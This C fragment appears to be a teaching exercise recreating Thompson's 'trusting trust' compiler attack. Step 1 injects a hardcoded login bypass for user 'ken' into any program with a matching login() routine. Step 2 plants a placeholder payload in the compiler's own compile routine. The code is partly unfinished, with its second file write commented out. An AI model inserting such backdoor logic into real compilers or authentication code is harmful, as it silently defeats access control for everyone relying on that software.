// can put any payload here.
// attack code

    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);
    /*****************************************************************
     * Step 1:
     */
 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    char* match_ptr = strstr(program, login_sig);
	char* new_prog = NULL;

    if (match_ptr != NULL){
        char* start_second_part = match_ptr + strlen(login_sig);

        size_t len_first_part = match_ptr - program; 
        size_t len_to_insert = strlen(login_attack);
        size_t len_second_part = strlen(start_second_part);
        size_t new_size = len_first_part + strlen(login_sig) + len_to_insert + len_second_part + 1;

        new_prog = malloc(sizeof(char) * new_size);
        strncpy(new_prog, program, len_first_part);
        new_prog[len_first_part] = '\0'; // for strcat
        strcat(new_prog, login_sig);
        strcat(new_prog, login_attack);
        strcat(new_prog, start_second_part);
    }

    char* new_login = new_prog;
    if (new_login != NULL){
        fprintf(fp, "%s", new_login);
        fclose(fp);
    }
       
    /*****************************************************************
     * Step 2:
     */

    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    static char compile_attack[] 
              = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
    match_ptr = strstr(program, compile_sig);

    if (match_ptr != NULL){
        char* start_second_part = match_ptr + strlen(compile_sig);

        size_t len_first_part = match_ptr - program; 
        size_t len_to_insert = strlen(compile_attack);
        size_t len_second_part = strlen(start_second_part);
        size_t new_size = len_first_part + strlen(compile_sig) + len_to_insert + len_second_part + 1;

        new_prog = malloc(sizeof(char) * new_size);
        strncpy(new_prog, program, len_first_part);
        new_prog[len_first_part] = '\0'; // for strcat
        strcat(new_prog, compile_sig);
        strcat(new_prog, compile_attack);
        strcat(new_prog, start_second_part);
    }

    // char* new_compile = new_prog;
    program = new_prog;
    // if (new_compile != NULL){
    //     fprintf(fp, "%s", new_compile);
    //     fclose(fp);
    // }

